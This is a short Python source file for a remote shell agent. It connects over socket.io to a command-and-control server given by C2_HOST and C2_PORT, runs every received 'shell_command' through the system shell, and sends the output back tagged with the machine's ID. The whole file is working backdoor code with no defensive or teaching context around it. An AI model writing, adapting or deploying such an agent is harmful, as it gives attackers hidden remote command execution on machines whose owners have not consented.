import subprocess
import threading
import socketio
from config import C2_HOST, C2_PORT, MACHINE_ID

# setup
sio = socketio.Client()
C2_URL = f"{C2_HOST}:{C2_PORT}"

@sio.on("connect") # confirmation
def on_connect():
    print("[+] Shell agent connected to C2")

@sio.on("shell_command") # the HEART of the shell agent
def on_command(data):
    """Receive command from C2, run it, send output back."""
    command = data.get("command", "")
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10 # MAY NEED TO BE ADJUSTED 
        )
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = "[timeout]"
    except Exception as e:
        output = f"[error] {e}"

    sio.emit("shell_output", {
        "machine": MACHINE_ID,
        "output": output
    })

# 
def start():
    sio.connect(C2_URL)
    sio.wait()

if __name__ == "__main__":
    start()